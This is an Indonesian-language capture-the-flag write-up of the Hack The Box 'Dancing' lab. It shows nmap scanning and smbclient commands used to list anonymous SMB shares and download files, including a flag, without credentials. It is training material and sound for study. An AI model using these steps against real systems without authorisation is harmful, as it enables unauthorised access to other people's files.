# 🚀 Hack The Box - Dancing Write-up

### **Machine Information**
| Machine Name | Target IP | Difficulty | Focus Service | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Dancing** | `10.129.171.100`| Very Easy | Windows | **SOLVED** ✅ |

<img width="784" height="543" alt="Screenshot 2026-05-06 141028" src="https://github.com/user-attachments/assets/36e59e9b-5d84-464a-a2f2-af5fec17d618" />


---

## 📝 Ringkasan Eksploitasi
Lab ini berfokus pada kerentanan layanan **SMB (Server Message Block)** yang dikonfigurasi tanpa autentikasi (*Anonymous Access*). Dengan melakukan enumerasi pada folder yang dibagikan (*shares*), kita dapat mengambil data sensitif secara ilegal.

---

## 🛠️ Langkah-langkah Penyelesaian

### 1. Koneksi Jaringan (VPN Setup)
Langkah pertama adalah menghubungkan mesin lokal ke lab Hack The Box menggunakan OpenVPN.
```bash
# Masuk ke direktori file VPN
cd Downloads

# Cek ketersediaan file
ls

# Menjalankan VPN
sudo openvpn starting_points_us-starting-point-1-dhcp(1).ovpn
```

<img width="994" height="190" alt="Screenshot 2026-05-06 134034" src="https://github.com/user-attachments/assets/e6f386e3-a602-49cd-acfd-e0029c8d0a91" />
<img width="1654" height="273" alt="Screenshot 2026-05-06 134108" src="https://github.com/user-attachments/assets/d6449b7e-a22a-4d9f-b304-ccbcefd83981" />

### 2. Pengujian Koneksi (Connectivity Test)
Memastikan target dapat dijangkau dari mesin Kali Linux.

```bash
ping -c 4 10.129.171.100
Hasil: 0% packet loss (Target aktif).
```

<img width="630" height="212" alt="Screenshot 2026-05-06 134220" src="https://github.com/user-attachments/assets/2622685a-b4b7-4ee6-b4c1-eb86b1dc8d2d" />


### 3. Pemindaian Port (Nmap Scanning)
Mencari tahu layanan terbuka pada target.

```bash
nmap -p445 -Pn -sC -T4 10.129.171.100
Hasil: Port 445/tcp terbuka dengan layanan microsoft-ds (SMB) menggunakan protokol smb2.
```

<img width="622" height="336" alt="Screenshot 2026-05-06 134529" src="https://github.com/user-attachments/assets/08b1ee38-9252-4947-ab79-3e1f8167c500" />


### 4. Enumerasi SMB (SMB Listing)
Mencari daftar folder (shares) yang tersedia secara anonim.

```bash
smbclient -L //10.129.171.100
Temuan: Ditemukan share ADMIN$, C$, IPC$, dan WorkShares.
```

<img width="862" height="232" alt="Screenshot 2026-05-06 135811" src="https://github.com/user-attachments/assets/7532744e-8024-4fb3-b831-d39498f98d38" />

### 5. Eksploitasi & Akses File
Mencoba mengakses folder target tanpa kata sandi.

```bash
# Mengakses folder WorkShares
smbclient //10.129.171.100/WorkShares
```
<img width="649" height="436" alt="Screenshot 2026-05-06 140806" src="https://github.com/user-attachments/assets/58b8e003-47ba-462d-b0de-db4643de83f8" />

# Navigasi di dalam SMB Console:
```bash
dir - Melihat isi folder.

cd Amy.J - Masuk ke folder Amy.

get worknotes.txt - Mengunduh catatan kerja.

cd .. - Kembali ke direktori sebelumnya.

cd James.P - Masuk ke folder James.

get flag.txt - Mengunduh file flag.
```

<img width="949" height="143" alt="Screenshot 2026-05-06 140833" src="https://github.com/user-attachments/assets/df53c474-83b6-4cc8-93ad-573bcddda32c" />
<img width="990" height="166" alt="Screenshot 2026-05-06 140843" src="https://github.com/user-attachments/assets/6d456189-e727-4052-b049-3ac407420f09" />
<img width="1006" height="225" alt="Screenshot 2026-05-06 141058" src="https://github.com/user-attachments/assets/b39f08cc-f353-41a6-83f8-e520699e2bbb" />


---
**Dokumentasi oleh:** Pagar Kristian Panjaitan - SMK Telkom 2 Medan (TKJ)
